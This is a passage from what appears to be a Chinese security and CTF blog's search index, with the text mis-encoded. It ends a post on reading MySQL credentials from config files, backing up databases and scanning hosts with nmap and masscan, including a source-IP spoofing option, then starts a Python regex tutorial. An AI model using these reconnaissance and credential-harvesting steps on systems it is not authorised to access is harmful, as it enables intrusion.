</span><br><span class="line">mysql&gt; flush privileges; (åˆ·æ–°)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure><p>è®°å¾—ä¿®æ”¹äº†mysqlå¯†ç åï¼Œè¿˜è¦æŠŠåˆšæ‰æ‰¾åˆ°çš„é…ç½®æ–‡ä»¶çš„å¯†ç ç»™ä¿®æ”¹äº†ï¼Œä¸ç„¶ä½ çš„webæœåŠ¡å°±ä¼šä¸æ­£å¸¸ã€‚</p><p>å¾—åˆ°mysqlå¯†ç ï¼Œä¸€èˆ¬æ¥è¯´ä½ å°±å¯ä»¥çœ‹çœ‹ä½ è‡ªå·±mysqlæ•°æ®åº“é‡Œçš„æ•°æ®ï¼Œä¸€èˆ¬æ¥è¯´åˆ«äººçš„æ•°æ®åº“è®°å½•ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ‰€ä»¥åˆ«äººä¸€äº›åå°è´¦å·å¯†ç ï¼Œä½ éƒ½å¯ä»¥æ‰¾åˆ°çš„ï¼ˆå¦‚æœé‡Œé¢å…¥åº“æ˜¯ä¸ç»è¿‡å“ˆå¸Œå¤„ç†çš„ï¼‰</p><p>å¦å¤–ï¼Œä¹Ÿå¤šæ³¨æ„æœ‰ä»€ä¹ˆåˆ«çš„é…ç½®æ–‡ä»¶ã€‚</p><p>å¤‡ä»½æ•°æ®åº“</p><p>â€‹        </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysqlå¤‡ä»½æŒ‡å®šæ•°æ®åº“ </span></span><br><span class="line">mysqldump -u ç”¨æˆ·å -<span class="selector-tag">p</span> å¯†ç  æ•°æ®åº“å &gt; back<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//mysqlå¤‡ä»½æ‰€æœ‰æ•°æ®åº“ </span></span><br><span class="line">mysqldump --all-databases &gt; bak<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//è¿˜åŸmysqlæ•°æ®åº“ </span></span><br><span class="line">mysql -u ç”¨æˆ·å -<span class="selector-tag">p</span> å¯†ç  æ•°æ®åº“å &lt; bak.sql</span><br></pre></td></tr></table></figure><h4 id="4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰"><a href="#4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰" class="headerlink" title="4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰"></a>4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICMPæ‰«æï¼š nmap -sP <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">æ£€æµ‹ç›®æ ‡æ“ä½œç³»ç»Ÿï¼š -O</span><br><span class="line">SYNæ‰«æ  ï¼š -sS</span><br><span class="line">æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹ï¼š -sV</span><br><span class="line">nmap -sS -p <span class="number">1337</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><h4 id="5ã€å—…æ¢ä¸»æœº-MASSCAN"><a href="#5ã€å—…æ¢ä¸»æœº-MASSCAN" class="headerlink" title="5ã€å—…æ¢ä¸»æœº(MASSCAN)"></a>5ã€å—…æ¢ä¸»æœº(MASSCAN)</h4><p><strong>å®‰è£…</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install clang git gcc make libpcap-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/robertdavidgraham/masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p><strong>å•ç«¯å£æ‰«æ</strong></p><p>æ‰«æ443ç«¯å£çš„Bç±»å­ç½‘</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p443</span><br></pre></td></tr></table></figure><p><strong>å¤šç«¯å£æ‰«æ</strong></p><p>æ‰«æ80æˆ–443ç«¯å£çš„Bç±»å­ç½‘</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p80,<span class="number">443</span></span><br></pre></td></tr></table></figure><p><strong>æ‰«æä¸€ç³»åˆ—ç«¯å£</strong></p><p>æ‰«æ22åˆ°25ç«¯å£çš„Bç±»å­ç½‘</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p22<span class="number">-25</span></span><br></pre></td></tr></table></figure><p><strong>å¿«é€Ÿæ‰«æ</strong></p><p>ä½¿ç”¨å¦‚ä¸Šçš„çš„è®¾ç½®å¯ä»¥å¾—åˆ°ç»“æœï¼Œä½†é€Ÿåº¦å°†æ˜¯æ¯”è¾ƒæ…¢ã€‚æ­£å¦‚å·²ç»è®¨è®ºçš„é‚£æ ·ï¼Œæ•´ä½“ä¸Šmasscanè¦å¿«ä¸€ç‚¹ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬åŠ å¿«é€Ÿåº¦ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMasscanæ‰«æé€Ÿåº¦ä¸ºæ¯ç§’100ä¸ªæ•°æ®åŒ…ï¼Œè¿™æ˜¯ç›¸å½“æ…¢çš„ã€‚ä¸ºäº†å¢åŠ è¿™ä¸€ç‚¹ï¼Œåªéœ€æä¾›è¯¥-rateé€‰é¡¹å¹¶æŒ‡å®šä¸€ä¸ªå€¼ã€‚</p><p>æ‰«æ100ä¸ªå¸¸è§ç«¯å£çš„Bç±»å­ç½‘ï¼Œæ¯ç§’100,000ä¸ªæ•°æ®åŒ…</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> -rate <span class="number">100000</span></span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥æ‰«æçš„é€Ÿåº¦å–å†³äºå¾ˆå¤šå› ç´ ï¼ŒåŒ…æ‹¬æ‚¨çš„æ“ä½œç³»ç»Ÿï¼ˆLinuxæ‰«ææ‰«æè¿œè¿œå¿«äºWindowsï¼‰ï¼Œç³»ç»Ÿçš„èµ„æºï¼Œæœ€é‡è¦çš„æ˜¯æ‚¨çš„å¸¦å®½ã€‚ä¸ºäº†ä»¥é«˜é€Ÿæ‰«æéå¸¸å¤§çš„ç½‘ç»œï¼Œæ‚¨éœ€è¦ä½¿ç”¨ç™¾ä¸‡ä»¥ä¸Šçš„é€Ÿç‡ï¼ˆ-rate 1000000ï¼‰ã€‚</p><p><strong>æ’é™¤ç›®æ ‡</strong></p><p>å› ä¸ºå¤§éƒ¨åˆ†çš„äº’è”ç½‘å¯ä»¥å¾ˆå¥½åœ°è¿›è¡Œæ‰«æï¼Œä¹Ÿå¯èƒ½åªæ˜¯å‡ºäºçº¯ç²¹çš„ç¤¼è²Œ â€“ ä½ å¯èƒ½æƒ³è¦æˆ–éœ€è¦ä»æ‰«æä¸­æ’é™¤ä¸€äº›ç›®æ ‡ã€‚ä¸ºæ­¤ï¼Œè¯·æä¾›â€“excludefileäº¤æ¢æœºä»¥åŠåŒ…å«è¦é¿å…çš„èŒƒå›´åˆ—è¡¨çš„æ–‡ä»¶çš„åç§°ã€‚</p><p>æ‰«æBç±»å­ç½‘ï¼Œä½†é¿å…åœ¨exclude.txtä¸­çš„</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> --excludefile exclude.txt</span><br></pre></td></tr></table></figure><p><strong>ç»“æœä¿å­˜</strong></p><p>æ‚¨å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„Unixé‡å®šå‘å™¨å°†è¾“å‡ºå‘é€åˆ°æ–‡ä»¶ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> &gt; results.txt</span><br></pre></td></tr></table></figure><p> é™¤æ­¤ä¹‹å¤–ï¼Œæ‚¨è¿˜å…·æœ‰ä»¥ä¸‹è¾“å‡ºé€‰é¡¹ï¼š</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oX <span class="keyword">filename</span>ï¼šè¾“å‡ºåˆ°<span class="keyword">filename</span>çš„XMLã€‚</span><br><span class="line">-oG <span class="keyword">filename</span>ï¼šè¾“å‡ºåˆ°<span class="keyword">filename</span>çš„grepableæ ¼å¼ã€‚</span><br><span class="line">-oJ <span class="keyword">filename</span>ï¼šè¾“å‡ºåˆ°<span class="keyword">filename</span>çš„JSONæ ¼å¼ã€‚</span><br></pre></td></tr></table></figure><p><strong>NmapåŠŸèƒ½</strong></p><p>æ­£å¦‚æœ€åˆæåˆ°çš„ï¼ŒMasscanå¯ä»¥åƒnmapè®¸å¤šå®‰å…¨äººå‘˜ä¸€æ ·å·¥ä½œã€‚è¿™é‡Œæœ‰ä¸€äº›å…¶ä»–ç±»ä¼¼nmapçš„é€‰é¡¹ï¼š</p><p>é€šè¿‡ä¼ é€’â€“nmapå¼€å…³å¯ä»¥çœ‹åˆ°ç±»ä¼¼nmapçš„åŠŸèƒ½ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>-iL filenameï¼šä»æ–‡ä»¶è¯»å–è¾“å…¥ã€‚</span><br><span class="line"><span class="bullet">2. </span>â€â€exclude hostï¼šåœ¨å‘½ä»¤è¡Œä¸­æ’é™¤ç½‘ç»œã€‚</span><br><span class="line"><span class="bullet">3. </span>â€â€excludefile filenameï¼šä»æ–‡ä»¶ä¸­æ’é™¤ç½‘ç»œã€‚</span><br><span class="line"><span class="bullet">4. </span>-Sï¼šæ¬ºéª—æºIPã€‚</span><br><span class="line"><span class="bullet">5. </span>-v interfaceï¼šè¯¦ç»†è¾“å‡ºã€‚</span><br><span class="line"><span class="bullet">6. </span>-vv interfaceï¼šéå¸¸å†—é•¿çš„è¾“å‡ºã€‚</span><br><span class="line"><span class="bullet">7. </span>-e interfaceï¼šä½¿ç”¨æŒ‡å®šçš„æ¥å£ã€‚</span><br><span class="line"><span class="bullet">8. </span>-e interfaceï¼šä½¿ç”¨æŒ‡å®šçš„æ¥å£ã€‚</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><hr><p><a href="https://www.cnblogs.com/machangwei-8/p/10353004.html" target="_blank" rel="noopener">https://www.cnblogs.com/machangwei-8/p/10353004.html</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/8367327.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8367327.html</a></p><p><a href="https://www.cnblogs.com/xdjun/p/9562030.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdjun/p/9562030.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python ä¹‹ æ­£åˆ™</title>
      <link href="/2019/07/21/python%20%E6%AD%A3%E5%88%99/"/>
      <url>/2019/07/21/python%20%E6%AD%A3%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>ä¹‹å‰æ‰“CTFç»å¸¸æ€§çš„å› ä¸ºä¸ä¼šå†™è„šæœ¬è€Œå»æ‰‹æ’¸ï¼Œè¿™å¤§å¤§é™ä½äº†æ•ˆç‡ï¼Œè€Œä¸”æœ‰çš„é¢˜ç”±äºæ—¶é—´é™åˆ¶ï¼Œæ˜¾ç„¶æ‰‹æ’¸è¡Œä¸é€šã€‚</p><p>è€Œä¸ä¼šå†™è„šæœ¬ç»å¸¸æ˜¯å› ä¸ºè‡ªå·±ä¸ä¼šå¤„ç†å¾—åˆ°çš„æ•°æ®ï¼Œå¦‚ä½•è¿‡æ»¤ã€æ‹¼æ¥ã€‚æ‰€ä»¥ä»Šå¤©å­¦ä¹ ä¸€ä¸‹pythonçš„reæ¨¡å—ï¼Œæ­£åˆ™æ›¿æ¢ï¼Œä»¥åŠåˆšåˆšä»Li4n0å­¦é•¿è„šæœ¬ä¸­å‘ç°çš„å­—ç¬¦è¡¨æ›¿æ¢ã€‚</p><h3 id="æ­£åˆ™"><a href="#æ­£åˆ™" class="headerlink" title="æ­£åˆ™"></a>æ­£åˆ™</h3><h4 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="^å…ƒå­—ç¬¦"></a>^å…ƒå­—ç¬¦</h4><p>å­—ç¬¦ä¸²å¼€å§‹ä½ç½®ä¸åŒ¹é…è§„åˆ™ç¬¦åˆå°±åŒ¹é…ï¼Œå¦åˆ™ä¸åŒ¹é…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^åŒ¹é…è§„åˆ™"</span>,<span class="string">"åŒ¹é…è§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…è§„åˆ™'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^åŒ¹é…è§„åˆ™"</span>,<span class="string">"åŒ¹é…sè§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>[^a-z]åå–ï¼Œ</p><p>åŒ¹é…å‡ºé™¤å­—æ¯å¤–çš„å­—ç¬¦ï¼Œ^å…ƒå­—ç¬¦å¦‚æœå†™åˆ°å­—ç¬¦é›†é‡Œå°±æ˜¯åå–</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"[^a-z]"</span>, <span class="string">"åŒ¹é…sè§„åˆ™è¿™sä¸ªå­—ç¬¦ä¸²æ˜¯å¦såŒ¹é…fè§„åˆ™åˆ™reåˆ™åˆ™åˆ™"</span>)   <span class="comment">#åå–ï¼ŒåŒ¹é…å‡ºé™¤å­—æ¯å¤–çš„å­—ç¬¦</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'è¿™'</span>, <span class="string">'ä¸ª'</span>, <span class="string">'å­—'</span>, <span class="string">'ç¬¦'</span>, <span class="string">'ä¸²'</span>, <span class="string">'æ˜¯'</span>, <span class="string">'å¦'</span>, <span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-1"><a href="#å…ƒå­—ç¬¦-1" class="headerlink" title="$å…ƒå­—ç¬¦"></a>$å…ƒå­—ç¬¦</h4><p>å­—ç¬¦ä¸²ç»“æŸä½ç½®ä¸åŒ¹é…è§„åˆ™ç¬¦åˆå°±åŒ¹é…ï¼Œå¦åˆ™ä¸åŒ¹é…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;a = re.findall(<span class="string">"åŒ¹é…è§„åˆ™$"</span>, <span class="string">"è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™"</span>)   <span class="comment">#å­—ç¬¦ä¸²ç»“æŸä½ç½®ä¸åŒ¹é…è§„åˆ™ç¬¦åˆå°±åŒ¹é…ï¼Œå¦åˆ™ä¸åŒ¹é…</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(a)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…è§„åˆ™'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-2"><a href="#å…ƒå­—ç¬¦-2" class="headerlink" title="*å…ƒå­—ç¬¦"></a>*å…ƒå­—ç¬¦</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„*å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯0ä¸ªæˆ–å¤šä¸ªåŸæœ¬å­—ç¬¦</p><p>åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æˆ–å¤šæ¬¡ï¼Œè´ªå©ªåŒ¹é…å‰å¯¼å­—ç¬¦æœ‰å¤šå°‘ä¸ªå°±åŒ¹é…å¤šå°‘ä¸ªå¾ˆè´ªå©ª</p><p>å¦‚æœè§„åˆ™é‡Œåªæœ‰ä¸€ä¸ªåˆ†ç»„ï¼Œå°½é‡é¿å…ç”¨*å¦åˆ™ä¼šæœ‰å¯èƒ½åŒ¹é…å‡ºç©ºå­—ç¬¦ä¸²</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™*"</span>,<span class="string">"è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™*"</span>,<span class="string">"è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…è§„'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™*"</span>,<span class="string">"whether this string is matching?"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-3"><a href="#å…ƒå­—ç¬¦-3" class="headerlink" title="+å…ƒå­—ç¬¦"></a>+å…ƒå­—ç¬¦</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„+å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯1ä¸ªæˆ–å¤šä¸ªåŸæœ¬å­—ç¬¦</p><p>åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡ï¼Œè´ªå©ªåŒ¹é…å‰å¯¼å­—ç¬¦æœ‰å¤šå°‘ä¸ªå°±åŒ¹é…å¤šå°‘ä¸ªå¾ˆè´ªå©ª</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…+"</span>, <span class="string">"åŒ¹é…é…é…é…é…è§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„+å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯1ä¸ªæˆ–å¤šä¸ªåŸæœ¬å­—ç¬¦</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…é…é…é…é…'</span>, <span class="string">'åŒ¹é…'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…"><a href="#å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…" class="headerlink" title="?å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…"></a>?å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„?å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯0ä¸ªæˆ–1ä¸ªåŸæœ¬å­—ç¬¦</p><p>åŒ¹é…ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ¬¡</p><p>è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½æ˜¯å¯ä»¥é˜²æ­¢è´ªå©ªåŒ¹é…ï¼Œè¯¦æƒ…è§é˜²è´ªå©ªåŒ¹é…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™?"</span>, <span class="string">"åŒ¹é…è§„è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„?å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯0ä¸ªæˆ–1ä¸ªåŸæœ¬å­—ç¬¦</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…è§„'</span>, <span class="string">'åŒ¹é…è§„åˆ™'</span>]</span><br></pre></td></tr></table></figure><h4 id><a href="#" class="headerlink" title=".*?"></a>.*?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'my title="sw engineer". His is "hello world"'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*?)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw engineer</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¦‚æœæ²¡æœ‰ ?ï¼Œ åˆ™ä¼šæŠ“åˆ°æœ€é•¿çš„ä¸¤ä¸ªåŒå¼•å·ä¹‹é—´çš„å†…å®¹</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw enginee<span class="string">r". His is "</span>hello world</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-èŒƒå›´"><a href="#å…ƒå­—ç¬¦-èŒƒå›´" class="headerlink" title="{}å…ƒå­—ç¬¦,èŒƒå›´"></a>{}å…ƒå­—ç¬¦,èŒƒå›´</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„ {} å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦ï¼Œæ˜¯è‡ªå®šä¹‰å­—ç¬¦æ•°ï¼Œä½æ•°çš„åŸæœ¬å­—ç¬¦</p><p>{m}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡ï¼Œ{m,n}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡ï¼Œè‹¥çœç•¥nï¼Œåˆ™åŒ¹é…mè‡³æ— é™æ¬¡</p><p>{0,}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æˆ–å¤šæ¬¡,ç­‰åŒäº*å…ƒå­—ç¬¦<br>{+,}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡,ç­‰åŒäº+å…ƒå­—ç¬¦<br>{0,1}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ¬¡,ç­‰åŒäº?å…ƒå­—ç¬¦</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 